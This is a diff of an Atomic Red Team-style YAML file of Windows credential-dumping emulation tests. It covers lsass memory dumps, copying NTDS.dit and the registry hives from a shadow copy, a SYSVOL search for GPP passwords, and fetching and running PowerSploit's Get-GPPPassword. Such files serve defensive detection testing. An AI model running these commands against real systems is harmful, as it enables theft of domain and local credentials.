@@ -121,12 +121,12 @@ atomic_tests:
         On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
         on the task bar and selecting "Task Manager".
 
-      2. Select lsass.exe:
-        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
-        and select it for manipulation.
+        2. Select lsass.exe:
+          If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
+          and select it for manipulation.
 
-      3. Dump lsass.exe memory:
-        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
+        3. Dump lsass.exe memory:
+          Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
 
 - name: Offline Credential Theft With Mimikatz
   description: |
@@ -192,113 +192,127 @@ atomic_tests:
     command: |
       vssadmin.exe create shadow /for=#{drive_letter}
 
-- name: Copy NTDS.dit from Volume Shadow Copy
-  description: |
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+      This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+      A successful test also requires the export of the SYSTEM Registry hive. 
+      This test must be executed on a Windows Domain Controller.
+    supported_platforms:
+      - windows
 
-    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
-    A successful test also requires the export of the SYSTEM Registry hive. 
-    This test must be executed on a Windows Domain Controller.
+    input_arguments:
+      vsc_name:
+        description: Name of Volume Shadow Copy
+        type: String
+        default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+      extract_path:
+        description: Path for extracted NTDS.dit
+        type: Path
+        default: C:\Windows\Temp
 
-  supported_platforms:
-    - windows
+    dependencies:
+      - description: |
+          Target must be a Domain Controller
+        prereq_command: |
+          reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+        get_prereq_command: |
+          echo Sorry, Promoting this machine to a Domain Controller must be done manually
+      - description: |
+          Volume shadow copy must exist
+        prereq_command: |
+          if not exist #{vsc_name} (exit /b 1)
+        get_prereq_command: |
+          echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
+      - description: |
+          Extract path must exist
+        prereq_command: |
+          if not exist #{extract_path} (exit /b 1)
+        get_prereq_command: |
+          mkdir #{extract_path}
+       
+    executor:
+      name: command_prompt
+      elevation_required: true
+      command: |
+        copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+        copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+        reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+      cleanup_command: |
+        del "#{extract_path}\ntds.dit"        >nul 2> nul
+        del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
+        del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
 
-  input_arguments:
-    vsc_name:
-      description: Name of Volume Shadow Copy
-      type: String
-      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
-    extract_path:
-      description: Path for extracted NTDS.dit
-      type: Path
-      default: C:\Windows\Temp
+  - name: GPP Passwords (findstr)
+    description: |
+      Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
 
-  dependencies:
-    - description: |
-        Target must be a Domain Controller
-      prereq_command: |
-        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
-      get_prereq_command: |
-        echo Sorry, Promoting this machine to a Domain Controller must be done manually
-    - description: |
-        Volume shadow copy must exist
-      prereq_command: |
-        if not exist #{vsc_name} (exit /b 1)
-      get_prereq_command: |
-        echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
-    - description: |
-        Extract path must exist
-      prereq_command: |
-        if not exist #{extract_path} (exit /b 1)
-      get_prereq_command: |
-        mkdir #{extract_path}
+    supported_platforms:
+      - windows
 
-        
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
-      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
-      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
-    cleanup_command: |
-      del "#{extract_path}\ntds.dit"        >nul 2> nul
-      del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
-      del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
+    executor:
+      name: command_prompt
+      elevation_required: false
+      command: |
+        findstr /S cpassword %logonserver%\sysvol\*.xml
 
-- name: GPP Passwords (findstr)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+  - name: GPP Passwords (Get-GPPPassword)
+    description: |
+      Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
 
-  supported_platforms:
-    - windows
+    supported_platforms:
+      - windows
 
-  executor:
-    name: command_prompt
-    elevation_required: false
-    command: |
-      findstr /S cpassword %logonserver%\sysvol\*.xml
+    input_arguments:
+      gpp_script_path:
+        description: Path to the Get-GPPPassword PowerShell Script
+        type: Path
+        default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+      gpp_script_url:
+        description: URL of the Get-GPPPassword PowerShell Script
+        type: URL
+        default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
 
-- name: GPP Passwords (Get-GPPPassword)
-  description: |
-    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+        prereq_command: |
+          if(Test-Path #{gpp_script_path}) { 0 } else { 1 }
+        get_prereq_command: |
+          $path = Split-Path #{gpp_script_path}
+          if(-not (Test-Path $path)){ New-Item -ItemType Directory -Path $path }
+          Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
 
-  supported_platforms:
-    - windows
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        . #{gpp_script_path}
+        Get-GPPPassword -Verbose
 
-  input_arguments:
-    gpp_script_path:
-      description: Path to the Get-GPPPassword PowerShell Script
-      type: Path
-      default: PathToAtomicsFolder\T1003\src\some\some\Get-GPPPassword.ps1
-    gpp_script_url:
-      description: URL of the Get-GPPPassword PowerShell Script
-      type: URL
-      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+  - name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
+    description: |
+      This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+      Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
 
-  dependency_executor_name: powershell 
-  dependencies: # (optional)
-    - description: |
-        Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
-      prereq_command: | 
-        if(Test-Path PathToAtomicsFolder\T1003\T1003\src\Get-GPPPassword.ps1) { 0 } else { 1 }
-      get_prereq_command: | 
-        Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
+    supported_platforms:
+      - windows
 
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      . #{gpp_script_path}
-      Get-GPPPassword -Verbose
-
-- name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
-  description: |
-    This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
-    Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
-
-  supported_platforms:
-    - windows
+    input_arguments:
+      sam_binary_path:
+        description: Path of the SAM file
+        type: string
+        default: C:\Windows\System32\config\sam
+      system_binary_path:
+        description: Path of the SYSTEM file
+        type: string
+        default: C:\Windows\System32\config\system
+      security_binary_path:
+        description: Path of the SECURITY file
+        type: string
+        default: C:\Windows\System32\config\security
+      output_folder:
+        description: Output folder path
+        type: Path
+        default: C:\Windows\Temp
 
   input_arguments:
     sam_binary_path:
